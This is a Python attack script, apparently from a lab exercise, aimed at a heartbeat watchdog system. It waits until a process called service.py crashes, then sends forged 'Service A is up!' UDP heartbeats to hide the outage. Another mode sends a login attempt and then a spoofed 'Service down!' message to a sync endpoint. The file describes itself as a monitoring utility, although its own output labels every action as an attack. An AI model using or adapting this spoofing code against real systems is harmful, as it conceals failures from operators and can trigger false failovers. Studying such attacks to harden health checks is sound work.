
import socket
import time
import sys
import subprocess
import argparse

import urllib.request
import base64

heartbeat_message = bytes("Service A is up!", "utf-8")

def parse_arguments():
    parser = argparse.ArgumentParser(
        description="Local heartbeat testing and monitoring utility"
    )

    parser.add_argument(
        "--watchdog-ip",
        required=True,
        help="Target service IP address"
    )

    parser.add_argument(
        "--watchdog-port",
        required=True,
        type=int,
        help="Target UDP port"
    )

    parser.add_argument(
        "--interval",
        type=int,
        default=3,
        help="Heartbeat interval in seconds (default: 3)"
    )

    parser.add_argument(
        "--count",
        type=int,
        default=3,
        help="Number of heartbeat messages (default: 3)"
    )

    parser.add_argument(
        "--attack",
        type=int,
        choices=[0, 1, 2],
        required=True,
        help="0 = Process monitoring, 1 = DoS, 2 = Spoofed Dropped Packed"
    )

    parser.add_argument(
            "--sync-ip",
            required=False,
            help="Target IP for sync"
        )
    parser.add_argument(
            "--sync-port",
            type=int,
            required=False,
            help="Target port for Sync"
        )
    parser.add_argument(
                "--service-ip",
                required=False,
                help="Target IP for Service2"
            )
    parser.add_argument(
            "--service-port",
            type=int,
            required=False,
            help="Target UDP Port for Service2"
        )

    args = parser.parse_args()

    if not 1 <= args.watchdog_port <= 65535:
        parser.error("Port must be between 1 and 65535")

    if(args.sync_port is not None):
        if(not 1 <= args.sync_port <= 65535):
            parser.error("Port must be between 1 and 65535")

    if args.interval < 0.1:
        parser.error("Interval must be at least 0.1 seconds")

    if args.count < 0:
        parser.error("Count cannot be negative")

    return args

def test_sync_channel(service_ip, service_port):
    credentials = base64.b64encode(
        "fakeusername:fakepassword".encode("utf-8")
    ).decode("ascii")

    url = f"http://{service_ip}:{service_port}/login"

    request = urllib.request.Request(
        url,
        headers={
            "Authorization": f"Basic {credentials}",
            "Content-Type": "application/json"
        },
        method="GET"
    )

    print(f"[TEST] Sending authentication request to {url}")

    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            print(f"[TEST] HTTP status: {response.status}")
            print("[TEST] Response:", response.read().decode("utf-8"))

    except urllib.error.HTTPError as e:
        print(f"[ERROR] HTTP status: {e.code}")
        print(e.read().decode("utf-8"))

    except urllib.error.URLError as e:
        print(f"[ERROR] Connection failed: {e.reason}")

    except Exception as e:
        print(f"[ERROR] {e}")

def is_service_running():
    try:
        result = subprocess.run(["pgrep", "-f", "service.py"])
        return result.returncode == 0 ## 0 means process is running, 1 no process found 2 or 3, error.

    except Exception as e:
        print(f"[ERROR] Process check failed: {e}")
        return False

def send(watchdog_ip, watchdog_port, interval, count, attack, sync_ip, sync_port, service_port, service_ip):
    sent = 0
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            if(attack == 1):
                for i in range(0,1):
                    print(f"[ATTACK] Sending login to {service_ip}:{service_port}")
                    test_sync_channel(service_ip, service_port)
                    
                down_message = bytes("Service down!", "utf-8")
                sock.sendto(down_message, (sync_ip, sync_port))



            else:
                print(f"[ATTACK] Heartbeat audit targeting {watchdog_ip}:{watchdog_port}")
                while count == 0 or sent < count:
                    sock.sendto(heartbeat_message, (watchdog_ip, watchdog_port))
                    sent += 1

                    print(f"[ATTACK] Forged heartbeat #{sent} sent")
                    time.sleep(interval)

    except KeyboardInterrupt:
        print("Monitoring stopped")

    except OSError as e:
        print(f"[ERROR] Socket error: {e}")


if __name__ == "__main__":
    args = parse_arguments()

    if(args.attack != 0):
        send(watchdog_ip=args.watchdog_ip, 
        watchdog_port=args.watchdog_port, 
        interval=args.interval, 
        count=0, 
        attack=args.attack, 
        sync_ip=args.sync_ip, 
        sync_port=args.sync_port,
        service_port=args.service_port,
        service_ip=args.service_ip)
    else:
        if not 1 <= args.watchdog_port <= 65535 or args.interval < 0.1 or args.count < 0:
            sys.exit("invalid args")

        try:
            print("[ATTACK] Starting...")
            tally = 0

            while True:
                if not is_service_running():
                    print("[ATTACK] Crash Detected")
                    break
                else:
                    print(f"[ATTACK] Process is running #{tally}")
                tally += 1
                time.sleep(args.interval)

        except Exception as e:
            print(f"[ERROR]: {e}")

        send(args.watchdog_ip, args.watchdog_port, args.interval, args.count, attack=False, sync_ip=None, sync_port=None, service_ip=None, service_port=None)
